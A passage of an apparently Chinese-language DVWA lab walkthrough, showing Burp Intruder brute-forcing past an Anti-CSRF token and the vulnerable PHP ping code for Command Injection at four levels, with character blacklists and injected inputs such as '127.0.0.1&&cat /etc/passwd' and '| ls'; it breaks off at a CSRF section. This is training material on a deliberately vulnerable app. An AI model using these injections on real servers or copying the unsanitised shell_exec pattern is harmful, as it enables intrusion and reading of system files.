mysqli_fetch_assoc( <span class=\"variable\">$result</span> );</span><br><span class=\"line\">        <span class=\"variable\">$avatar</span> = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;avatar&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Login successful</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;p&gt;Welcome to the password protected area <span class=\"subst\">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;img src=\\&quot;<span class=\"subst\">&#123;$avatar&#125;</span>\\&quot; /&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Login failed</span></span><br><span class=\"line\">        sleep( rand( <span class=\"number\">0</span>, <span class=\"number\">3</span> ) );</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>加入Anti-CSRF token机制，验证本次请求中是否包含上一个回应中的token</p>\n</li>\n<li>\n<p>抓包分析</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174153220.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174153220.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425174153220\" /></p>\n</li>\n<li>\n<p>Send to intruder，选择position，两个爆破位应使用Pitchfork模式</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174257108.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174257108.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425174257108\" /></p>\n</li>\n<li>\n<p>option中选择Grep-Extract，添加回应包中的token值</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174734492.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174734492.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425174734492\" /></p>\n</li>\n<li>\n<p>第一个位置应用字典，第二个位置应用grep内容，并初始化token值</p>\n</li>\n</ul>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175021711.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175021711.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425175021711\" /></p>\n<ul>\n<li>Start attack，一样看长度</li>\n</ul>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175428340.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175428340.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425175428340\" /></p>\n<hr />\n<h2 id=\"command-injection\"><a class=\"markdownIt-Anchor\" href=\"#command-injection\"></a> Command Injection</h2>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175815201.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175815201.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425175815201\" /></p>\n<p>源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Command Injection</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Impossible Command Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$target</span> = <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;ip&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$target</span> = stripslashes( <span class=\"variable\">$target</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Split the IP into 4 octects</span></span><br><span class=\"line\">    <span class=\"variable\">$octet</span> = explode( <span class=\"string\">&quot;.&quot;</span>, <span class=\"variable\">$target</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check IF each octet is an integer</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( ( is_numeric( <span class=\"variable\">$octet</span>[<span class=\"number\">0</span>] ) ) &amp;&amp; ( is_numeric( <span class=\"variable\">$octet</span>[<span class=\"number\">1</span>] ) ) &amp;&amp; ( is_numeric( <span class=\"variable\">$octet</span>[<span class=\"number\">2</span>] ) ) &amp;&amp; ( is_numeric( <span class=\"variable\">$octet</span>[<span class=\"number\">3</span>] ) ) &amp;&amp; ( sizeof( <span class=\"variable\">$octet</span> ) == <span class=\"number\">4</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class=\"line\">        <span class=\"variable\">$target</span> = <span class=\"variable\">$octet</span>[<span class=\"number\">0</span>] . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$octet</span>[<span class=\"number\">1</span>] . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$octet</span>[<span class=\"number\">2</span>] . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$octet</span>[<span class=\"number\">3</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Determine OS and execute the ping command.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( stristr( php_uname( <span class=\"string\">&#x27;s&#x27;</span> ), <span class=\"string\">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Windows</span></span><br><span class=\"line\">            <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// *nix</span></span><br><span class=\"line\">            <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  -c 4 &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for the end user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Ops. Let the user name theres a mistake</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#High Command Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$target</span> = trim(<span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;ip&#x27;</span> ]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Set blacklist</span></span><br><span class=\"line\">    <span class=\"variable\">$substitutions</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">&#x27;&amp;&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;;&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;| &#x27;</span> =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;-&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;$&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;(&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;)&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;`&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;||&#x27;</span> =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Remove any of the charactars in the array (blacklist).</span></span><br><span class=\"line\">    <span class=\"variable\">$target</span> = str_replace( array_keys( <span class=\"variable\">$substitutions</span> ), <span class=\"variable\">$substitutions</span>, <span class=\"variable\">$target</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Determine OS and execute the ping command.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( stristr( php_uname( <span class=\"string\">&#x27;s&#x27;</span> ), <span class=\"string\">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Windows</span></span><br><span class=\"line\">        <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// *nix</span></span><br><span class=\"line\">        <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  -c 4 &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Feedback for the end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Medium Command Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$target</span> = <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;ip&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Set blacklist</span></span><br><span class=\"line\">    <span class=\"variable\">$substitutions</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;;&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Remove any of the charactars in the array (blacklist).</span></span><br><span class=\"line\">    <span class=\"variable\">$target</span> = str_replace( array_keys( <span class=\"variable\">$substitutions</span> ), <span class=\"variable\">$substitutions</span>, <span class=\"variable\">$target</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Determine OS and execute the ping command.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( stristr( php_uname( <span class=\"string\">&#x27;s&#x27;</span> ), <span class=\"string\">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Windows</span></span><br><span class=\"line\">        <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// *nix</span></span><br><span class=\"line\">        <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  -c 4 &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Feedback for the end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Low Command Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$target</span> = <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;ip&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Determine OS and execute the ping command.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( stristr( php_uname( <span class=\"string\">&#x27;s&#x27;</span> ), <span class=\"string\">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Windows</span></span><br><span class=\"line\">        <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// *nix</span></span><br><span class=\"line\">        <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  -c 4 &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Feedback for the end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-2\"><a class=\"markdownIt-Anchor\" href=\"#low-2\"></a> Low</h3>\n<ul>\n<li>\n<p>127.0.0.1</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425180350690.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425180350690.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425180350690\" /></p>\n</li>\n<li>\n<p>127.0.0.1&amp;&amp; whoami</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425180709539.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425180709539.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425180709539\" /></p>\n</li>\n<li>\n<p>127.0.0.1&amp;&amp; pwd</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425182713991.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425182713991.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425182713991\" /></p>\n</li>\n<li>\n<p>127.0.0.1&amp;&amp;ls …/…/</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183108288.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183108288.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425183108288\" /></p>\n</li>\n<li>\n<p>127.0.0.1&amp;&amp;cat …/…/php.ini</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183656452.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183656452.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425183656452\" /></p>\n</li>\n<li>\n<p>127.0.0.1&amp;&amp;cat /etc/passwd</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183851680.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183851680.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425183851680\" /></p>\n</li>\n</ul>\n<h3 id=\"medium-2\"><a class=\"markdownIt-Anchor\" href=\"#medium-2\"></a> Medium</h3>\n<ul>\n<li>\n<p>127.0.0.1&amp; ls</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184026503.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184026503.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425184026503\" /></p>\n</li>\n<li>\n<p>127.0.0.1&amp; cat /etc/passwd</p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184132006.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184132006.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425184132006\" /></p>\n</li>\n</ul>\n<h3 id=\"high-2\"><a class=\"markdownIt-Anchor\" href=\"#high-2\"></a> High</h3>\n<ul>\n<li>127.0.0.1 |ls</li>\n</ul>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184427077.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184427077.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210425184427077\" /></p>\n<hr />\n<h2 id=\"cross-site-request-forgery-csrf\"><a class=\"markdownIt-Anchor\" href=\"#cross-site-request-forgery-csrf\"></a> Cross Site Request Forgery (CSRF)</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span 